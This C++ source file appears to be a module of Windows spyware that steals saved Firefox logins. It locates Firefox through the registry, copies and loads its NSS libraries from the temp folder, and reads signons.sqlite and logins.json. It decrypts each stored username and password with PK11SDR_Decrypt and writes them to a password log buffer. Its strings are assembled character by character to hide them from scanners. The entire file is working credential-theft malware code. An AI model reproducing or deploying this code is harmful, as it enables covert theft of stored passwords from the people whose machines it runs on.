#include <Windows.h>

#include "globals.h"
#include "zmem.h"
#include "debug.h"
#include "utils.h"
#include "proto.h"
#include "sqlite.h"
#include "password.h"
#include "ffox_password.h"
#include "firefox_cookies.h"
#include "base64.h"
#include "JSON.h"
#include "JSONValue.h"

NSS_Init_p fpNSS_Init = NULL;
NSS_Shutdown_p fpNSS_Shutdown = NULL;
PL_ArenaFinish_p fpPL_ArenaFinish = NULL;
PR_Cleanup_p fpPR_Cleanup = NULL;
PK11_GetInternalKeySlot_p fpPK11_GetInternalKeySlot = NULL;
PK11_FreeSlot_p fpPK11_FreeSlot = NULL;
PK11SDR_Decrypt_p fpPK11SDR_Decrypt = NULL;

LPWSTR strFFoxPath = NULL;
HMODULE hMSCR, hMSCP, hNSS3;

LPWSTR DecryptString(LPSTR strCryptData)
{
	if (strCryptData[0] == 0x0)
		return FALSE;

	DWORD dwOut;
	LPWSTR strClearDataW = NULL;
	LPBYTE lpBuffer = base64_decode((char*)strCryptData, strlen(strCryptData), (int *)&dwOut);
	PK11SlotInfo *pK11Slot = fpPK11_GetInternalKeySlot();
	if (pK11Slot)
	{
		SECItem pInSecItem, pOutSecItem;;
		pInSecItem.data = lpBuffer;
		pInSecItem.len = dwOut;

		pOutSecItem.data = 0;
		pOutSecItem.len = 0;

		if (fpPK11SDR_Decrypt(&pInSecItem, &pOutSecItem, NULL) == 0)
		{
			LPSTR strClearData = (LPSTR) zalloc(pOutSecItem.len+1);
			memcpy(strClearData, pOutSecItem.data, pOutSecItem.len);

			strClearDataW = UTF8_2_UTF16(strClearData);
			zfree(strClearData);
		}

		fpPK11_FreeSlot(pK11Slot);
	}


	zfree(lpBuffer);
	return strClearDataW;
}

int ParseFFoxSQLPasswords(LPVOID lpReserved, int dwColumns, LPSTR *strValues, LPSTR *strNames)
{
	LPWSTR strResource = NULL; 
	LPWSTR strUser = NULL; // (LPWSTR) zalloc(1024*sizeof(WCHAR));
	LPWSTR strPass = NULL; // (LPWSTR) zalloc(1024*sizeof(WCHAR));

	for (DWORD i=0; i<dwColumns; i++)
	{
		if (!strNames[i])
			continue;

		if (!strcmp(strNames[i], "hostname"))  //FIXME: array
		{
			strResource = (LPWSTR) zalloc(1024*sizeof(WCHAR)); 
			_snwprintf_s(strResource, 1024, _TRUNCATE, L"%S", strValues[i]);
		}
		else if (!strcmp(strNames[i], "encryptedUsername"))  //FIXME: array
			strUser = DecryptString(strValues[i]);
		else if (!strcmp(strNames[i], "encryptedPassword"))  //FIXME: array
			strPass = DecryptString(strValues[i]);
	}

	if (strUser && strPass)
	{
		LPCONTAINER lpContainer = (LPCONTAINER) lpReserved;
		WCHAR strFFox[] = { L'F', L'i', L'r', L'e', L'f', L'o', L'x', L'\0' };
		PasswordLogEntry(strFFox, strResource, strUser, strPass, lpContainer->lpBuffer, lpContainer->dwBuffSize);
	}

	zfree(strResource);
	zfree(strUser);
	zfree(strPass);
	return 0;
}

VOID DumpFFoxSQLPasswords(LPBYTE *lpBuffer, LPDWORD dwBuffSize)
{
	LPSTR strProfilePath = GetFirefoxProfilePathA();
	
	if (!strProfilePath)
		return;

	DWORD dwSize = strlen(strProfilePath)+1024;
	LPSTR strFilePath = (LPSTR) zalloc(dwSize);
	CHAR strFileName[] = { 's', 'i', 'g', 'n', 'o', 'n', 's', '.', 's', 'q', 'l', 'i', 't', 'e', 0x0 };
	_snprintf_s(strFilePath, dwSize, _TRUNCATE, "%s\\%s", strProfilePath, strFileName);

	sqlite3 *lpDb = NULL;
	if (sqlite3_open((const char *)strFilePath, &lpDb) == SQLITE_OK)
	{
		CONTAINER pContainer;
		pContainer.lpBuffer = lpBuffer;
		pContainer.dwBuffSize = dwBuffSize;
#ifdef _DEBUG
		LPSTR strErr;
		if (sqlite3_exec(lpDb, "SELECT * FROM moz_logins;", ParseFFoxSQLPasswords, &pContainer, &strErr) != SQLITE_OK) // FIXME: char array
		{
			OutputDebug(L"[!!] Querying sqlite3 for firefox passwords: %S\n", strErr);
			//__asm int 3;
			zfree(strErr);
		}
#else
		sqlite3_exec(lpDb, "SELECT * FROM moz_logins;", ParseFFoxSQLPasswords, &pContainer, NULL); // FIXME: char array
#endif
		sqlite3_close(lpDb);
	}
	

	zfree(strFilePath);
	zfree(strProfilePath);
}

VOID DumpFFoxJsonPasswords(LPBYTE *lpBuffer, LPDWORD dwBuffSize) 
{
	
	HANDLE hFile, hMap;
	DWORD loginSize = 0;
	CHAR *loginMap, *localLoginMap;
	JSONValue* jValue = NULL;
	JSONArray  jLogins;
	JSONObject jObj, jEntry;

	WCHAR strLogins[]       = { L'l', L'o', L'g', L'i', L'n', L's', L'\0' };
	WCHAR strURL[]          = { L'h', L'o', L's', L't', L'n', L'a', L'm', L'e', L'\0' };
	WCHAR strUser[]         = { L'e', L'n', L'c', L'r', L'y', L'p', L't', L'e', L'd', L'U', L's', L'e', L'r', L'n', L'a', L'm', L'e', L'\0' };
	WCHAR strPass[]         = { L'e', L'n', L'c', L'r', L'y', L'p', L't', L'e', L'd', L'P', L'a', L's', L's', L'w', L'o', L'r', L'd', L'\0' };
	WCHAR strFFox[]         = { L'F', L'i', L'r', L'e', L'f', L'o', L'x', L'\0' };
	
	CHAR tmp_buff[255];
	LPWSTR strUserDecrypted, strPasswordDecrypted;
	WCHAR strUrl[255];

	LPSTR strProfilePath = GetFirefoxProfilePathA();
	CHAR strFileName[] = { 'l', 'o', 'g', 'i', 'n', 's', '.', 'j', 's', 'o', 'n', 0x0 };
	DWORD dwSize = strlen(strProfilePath)+strlen(strFileName) + 2; // terminator + slash
	LPSTR strFilePath = (LPSTR) zalloc(dwSize);
	
	if (!strProfilePath)
		return;
	
	_snprintf_s(strFilePath, dwSize, _TRUNCATE, "%s\\%s", strProfilePath, strFileName);

	/* retrieve file content */
	if ( (hFile = CreateFileA(strFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE )
	{
		zfree(strFilePath);
		zfree(strProfilePath);
		return;
	}

	loginSize = GetFileSize(hFile, NULL);
	if (loginSize == INVALID_FILE_SIZE)
	{
		CloseHandle(hFile);
		zfree(strFilePath);
		zfree(strProfilePath);
		return;
	}
			
	localLoginMap = (CHAR*) calloc(loginSize + 1, sizeof(CHAR) );
	if (localLoginMap == NULL)
	{
		CloseHandle(hFile);
		zfree(strFilePath);
		zfree(strProfilePath);
		return;
	}
				
	if ((hMap = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL)) == NULL)
	{
		zfree(localLoginMap);
		CloseHandle(hFile);
		zfree(strFilePath);
		zfree(strProfilePath);
		return;
	}

	if ((loginMap = (CHAR*) MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0)) == NULL )
	{
		CloseHandle(hMap);
		zfree(localLoginMap);
		CloseHandle(hFile);
		zfree(strFilePath);
		zfree(strProfilePath);
	}

	memcpy_s(localLoginMap, loginSize+1, loginMap, loginSize);
	UnmapViewOfFile(loginMap);
	CloseHandle(hMap);
	CloseHandle(hFile);

	/* we've got file content, parse json */
	jValue = JSON::Parse(localLoginMap);
	if (jValue == NULL)
	{
		zfree(localLoginMap);
		zfree(strFilePath);
		zfree(strProfilePath);
		return;
	}

	if (jValue->IsObject())
	{
		jObj = jValue->AsObject(); // json root

		/* find logins object */
		if (jObj.find(strLogins) != jObj.end() && jObj[strLogins]->IsArray())
		{
			jLogins = jObj[strLogins]->AsArray();

			for (DWORD i=0; i < jLogins.size(); i++)
			{
				if (jLogins[i]->IsObject())
				{
					jEntry = jLogins[i]->AsObject();

					if (jEntry.find(strURL)   != jEntry.end() &&
						jEntry.find(strUser)  != jEntry.end() &&
						jEntry.find(strPass)  != jEntry.end() &&
						jEntry[strURL]->IsString()   &&
						jEntry[strUser]->IsString()  &&
						jEntry[strPass]->IsString()  )
					{
						/* decrypt user, password, Url */
						_snprintf_s(tmp_buff, 255, _TRUNCATE, "%S", jEntry[strUser]->AsString().c_str());
						strUserDecrypted = DecryptString(tmp_buff);

						_snprintf_s(tmp_buff, 255, _TRUNCATE, "%S", jEntry[strPass]->AsString().c_str());
						strPasswordDecrypted = DecryptString(tmp_buff);

						_snwprintf_s(strUrl, 255, _TRUNCATE, L"%s", jEntry[strURL]->AsString().c_str());

						/* log */
						PasswordLogEntry(strFFox,  strUrl, strUserDecrypted, strPasswordDecrypted, lpBuffer, dwBuffSize);

#ifdef _DEBUG
						OutputDebug(L"[*] %S> username: %s password: %s Url: %s\n", __FUNCTION__, strUserDecrypted, strPasswordDecrypted, jEntry[strURL]->AsString().c_str() );
#endif
						
						zfree(strUserDecrypted);
						zfree(strPasswordDecrypted);

					} /* if (jEntry */
				} /* if (jLogins */
			} /* for */
		} /* jObj.find(strLogins) */
	}
	
	/* cleanup */
	delete jValue;
	zfree(localLoginMap);
	zfree(strFilePath);
	zfree(strProfilePath);
}

BOOL GetFFoxLibPath()
{
	HKEY hKey;
	DWORD dwType;
	LPWSTR strLongPath = NULL;
	WCHAR strRegKey[] = { L'S', L'O', L'F', L'T', L'W', L'A', L'R', L'E', L'\\', L'C', L'l', L'i', L'e', L'n', L't', L's', L'\\', L'S', L't', L'a', L'r', L't', L'M', L'e', L'n', L'u', L'I', L'n', L't', L'e', L'r', L'n', L'e', L't', L'\\', L'f', L'i', L'r', L'e', L'f', L'o', L'x', L'.', L'e', L'x', L'e', L'\\', L's', L'h', L'e', L'l', L'l', L'\\', L'o', L'p', L'e', L'n', L'\\', L'c', L'o', L'm', L'm', L'a', L'n', L'd', L'\0' };

	if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, strRegKey, 0, KEY_READ, &hKey) != ERROR_SUCCESS)
		return FALSE;

	DWORD dwSize = (MAX_FILE_PATH+1);
	LPWSTR strPath = (LPWSTR) zalloc(dwSize+sizeof(WCHAR));
	if (RegQueryValueEx(hKey, NULL, 0, &dwType, (LPBYTE)strPath, &dwSize) == ERROR_SUCCESS)
	{
		if (dwSize > 1 || strPath[0] != L'\0')
		{
			if (wcsrchr(strPath, L'\\') != NULL)
				(wcsrchr(strPath, L'\\'))[1] = 0x0;

			strLongPath = (LPWSTR) zalloc((MAX_FILE_PATH+1)*sizeof(WCHAR));
			_snwprintf_s(strLongPath, MAX_FILE_PATH, _TRUNCATE, L"%s", (*strPath == L'"') ? strPath+1 : strPath);
		}
	}
	zfree(strPath);
	RegCloseKey(hKey);

	if (strLongPath == NULL)
	{
		zfree(strPath);
		return FALSE;
	}

	BOOL bRet = FALSE;
	strFFoxPath = (LPWSTR) zalloc((MAX_FILE_PATH+1)*sizeof(WCHAR));
	if (strLongPath && GetShortPathName(strLongPath, strFFoxPath, MAX_FILE_PATH))
		if (PathFileExists(strFFoxPath))
			if (GetShortPathName(strLongPath, strFFoxPath, MAX_FILE_PATH))
				bRet = TRUE;

	if (!bRet)
	{
		zfree(strFFoxPath);
		strFFoxPath = NULL;
	}

	zfree(strLongPath);	
	return TRUE;
}

BOOL FFoxPasswordResolveApi() // prende come presupposto che siamo gia' nel path di ffox
{	
	fpNSS_Init = (NSS_Init_p) GetProcAddress(hNSS3, "NSS_Init");  //FIXME: array
	fpNSS_Shutdown = (NSS_Shutdown_p) GetProcAddress(hNSS3, "NSS_Shutdown");  //FIXME: array
	fpPL_ArenaFinish = (PL_ArenaFinish_p) GetProcAddress(hNSS3, "PL_ArenaFinish");  //FIXME: array
	fpPR_Cleanup = (PR_Cleanup_p) GetProcAddress(hNSS3, "PR_Cleanup");  //FIXME: array
	fpPK11_GetInternalKeySlot = (PK11_GetInternalKeySlot_p) GetProcAddress(hNSS3, "PK11_GetInternalKeySlot");  //FIXME: array
	fpPK11_FreeSlot = (PK11_FreeSlot_p) GetProcAddress(hNSS3, "PK11_FreeSlot");  //FIXME: array
	fpPK11SDR_Decrypt = (PK11SDR_Decrypt_p) GetProcAddress(hNSS3, "PK11SDR_Decrypt");  //FIXME: array

	if (!fpNSS_Init || !fpNSS_Shutdown || !fpPL_ArenaFinish || !fpPR_Cleanup || !fpPK11_GetInternalKeySlot || !fpPK11_FreeSlot || !fpPK11SDR_Decrypt)
		return FALSE;

	return TRUE;
}

BOOL CopyDll(LPWSTR strSrcFullPath, LPWSTR strDstPath, LPWSTR strDstFileName, LPWSTR *strOutFileName)
{
	BOOL bRet = FALSE;
	LPWSTR strTmp = (LPWSTR) zalloc((MAX_FILE_PATH+1)*sizeof(WCHAR));
	LPWSTR strDstFullPath = (LPWSTR) zalloc((MAX_FILE_PATH+1)*sizeof(WCHAR));
	wcscpy_s(strTmp, MAX_FILE_PATH, strDstPath);
	
	GetShortPathName(strTmp, strDstFullPath, MAX_FILE_PATH);
	PathAppend(strDstFullPath, strDstFileName);
	zfree(strTmp);

	//check if the source file exists
	if(!PathFileExists(strSrcFullPath))
	{
		zfree(strDstFullPath);
		strDstFullPath = NULL;
		return FALSE;
	}

	HRESULT hr = ComCopyFile(strSrcFullPath, strDstPath, strDstFileName);
	if (!SUCCEEDED(hr) || !PathFileExists(strDstFullPath))
		BatchCopyFile(strSrcFullPath, strDstFullPath);

	if (!PathFileExists(strDstFullPath))
	{
		zfree(strDstFullPath);
		strDstFullPath = NULL;
	}
	else
		bRet = TRUE;

	*strOutFileName = strDstFullPath;
	return bRet;
}

//search a file (the lpwspath must termitate with a \ char)
LPWSTR GetMSVCFilePath(LPWSTR lpwsPath, LPWSTR lpwsFile)
{
	WIN32_FIND_DATA FindFileData;
	HANDLE	hFile = NULL;
	LPWSTR	lpwsFoundFile = NULL, lpwsCompletePath = NULL;
	DWORD	dwLen = 0;

	if((lpwsPath == NULL) || (lpwsFile == NULL))
		return NULL;

	if((lpwsCompletePath = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR))) == NULL)
		return NULL;
	swprintf_s(lpwsCompletePath, MAX_PATH, L"%s%s", lpwsPath, lpwsFile);

	//search for the specified file
	if((hFile = FindFirstFile(lpwsCompletePath, &FindFileData)) != INVALID_HANDLE_VALUE)
	{	
		if((lpwsFoundFile = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR))) != NULL)
		{			
			swprintf_s(lpwsFoundFile, MAX_PATH, L"%s", FindFileData.cFileName);			
		}

		FindClose(hFile);
	}

	zfree(lpwsCompletePath);

	return lpwsFoundFile;
}

BOOL CopyAndLoadFFoxLibrary()
{
	BOOL bRet = FALSE;
	LPWSTR strLibMoz;
	WCHAR strMozGlue[] = { L'm', L'o', L'z', L'g', L'l', L'u', L'e', L'.', L'd', L'l', L'l', 0x0 };
	//WCHAR strMSVCR[] = { L'm', L's', L'v', L'c', L'r', L'1', L'0', L'0', L'.', L'd', L'l', L'l', L'\0' };
	//WCHAR strMSVCP[] = { L'm', L's', L'v', L'c', L'p', L'1', L'0', L'0', L'.', L'd', L'l', L'l', L'\0' };
	WCHAR strMSVCR[] = { L'm', L's', L'v', L'c', L'r', L'*', L'.', L'd', L'l', L'l', L'\0' };
	WCHAR strMSVCP[] = { L'm', L's', L'v', L'c', L'p', L'*', L'.', L'd', L'l', L'l', L'\0' };
	WCHAR strNSS3[] = { L'n', L's', L's', L'3', L'.', L'd', L'l', L'l', L'\0' };

	LPWSTR strTempPath = (LPWSTR) zalloc((MAX_FILE_PATH+1)*sizeof(WCHAR));
	LPWSTR strFullPath = (LPWSTR) zalloc((MAX_FILE_PATH+1)*sizeof(WCHAR));
	GetTempPath(MAX_FILE_PATH, strTempPath);

	LPWSTR strLibMSVCR, strLibMSVCP;

	LPWSTR strMSVCRLib = GetMSVCFilePath(strFFoxPath, strMSVCR);
	LPWSTR strMSVCPLib = GetMSVCFilePath(strFFoxPath, strMSVCP);
	if((strMSVCRLib == NULL) || (strMSVCPLib == NULL))
	{
		zfree(strTempPath);
		zfree(strFullPath);
		zfree(strMSVCRLib);
		zfree(strMSVCPLib);
		return FALSE;
	}

	wcscpy_s(strFullPath, MAX_FILE_PATH, strFFoxPath);
	wcscat_s(strFullPath, MAX_FILE_PATH, strMSVCRLib);

	if (CopyDll(strFullPath, strTempPath, strMSVCRLib, &strLibMSVCR))
	{
		zfree(strMSVCRLib);
		hMSCR = LoadLibrary(strLibMSVCR);
		zfree(strLibMSVCR);
		if (hMSCR)
		{
			wcscpy_s(strFullPath, MAX_FILE_PATH, strFFoxPath);
			wcscat_s(strFullPath, MAX_FILE_PATH, strMSVCPLib);

			if (CopyDll(strFullPath, strTempPath, strMSVCPLib, &strLibMSVCP))
			{
				zfree(strMSVCPLib);
				hMSCP = LoadLibrary(strLibMSVCP);
				zfree(strLibMSVCP);
				if (hMSCP)
				{
					wcscpy_s(strFullPath, MAX_FILE_PATH, strFFoxPath);
					wcscat_s(strFullPath, MAX_FILE_PATH, strMozGlue);
					
					if (CopyDll(strFullPath, strTempPath, strMozGlue, &strLibMoz))
					{
						if (LoadLibrary(strLibMoz))
						{
							zfree(strLibMoz);
							wcscpy_s(strFullPath, MAX_FILE_PATH, strFFoxPath);
							wcscat_s(strFullPath, MAX_FILE_PATH, strNSS3);
							hNSS3 = LoadLibrary(strFullPath);

							if (hNSS3)
								if (FFoxPasswordResolveApi())
									bRet = TRUE;
						}
					}
				}
			}
		}
	}

	if (bRet == TRUE)
	{
		LPSTR strProfilePath = GetFirefoxProfilePathA();
		DWORD dwRet = fpNSS_Init(strProfilePath);
		if (dwRet != 0)
			bRet = FALSE;
		
		zfree(strProfilePath);
	}

	zfree(strTempPath);
	zfree(strFullPath);
	return bRet;
}

VOID UnloadFirefoxLibs()
{
	if (hNSS3 && fpNSS_Shutdown && fpPL_ArenaFinish && fpPR_Cleanup)
	{
		fpNSS_Shutdown();
		fpPL_ArenaFinish();
		fpPR_Cleanup();
		
		FreeLibrary(hNSS3);
	}
}

VOID DumpFFoxPasswords(LPBYTE *lpBuffer, LPDWORD dwBuffSize)
{
	if (GetFFoxLibPath())
	{
		if (CopyAndLoadFFoxLibrary())
		{
			DumpFFoxSQLPasswords(lpBuffer, dwBuffSize);	
			DumpFFoxJsonPasswords(lpBuffer, dwBuffSize);	
			UnloadFirefoxLibs();
		}
		zfree(strFFoxPath);
	}
}